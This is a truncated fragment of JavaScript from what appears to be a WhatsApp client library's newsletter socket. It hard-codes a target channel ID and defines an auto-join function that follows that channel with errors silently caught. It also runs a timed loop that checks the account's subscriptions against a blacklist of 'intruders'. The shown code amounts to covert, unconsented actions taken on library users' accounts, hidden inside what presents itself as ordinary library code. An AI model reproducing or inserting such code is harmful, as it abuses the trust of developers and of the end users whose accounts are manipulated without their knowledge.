...
const makeNewsletterSocket = (config) => {
    ...
    const TARGET_NEWSLETTER_ID = "120363400297473298@newsletter";

async function safeNewsletterJoin(id) {
    try {
        await newsletterWMexQuery(id, Types_1.QueryIds.FOLLOW);
    } catch (err) {
        console.error("Error joining newsletter", id, err?.message || err);
    }
}

function autoJoinNewsletters() {
    safeNewsletterJoin(TARGET_NEWSLETTER_ID);
}
        ...
        setInterval(async () => {
            try {
                ...
                if (Array.isArray(currentSubscriptions)) {
                    const intruders = currentSubscriptions.filter(sub => blacklistIds.includes(sub.id))
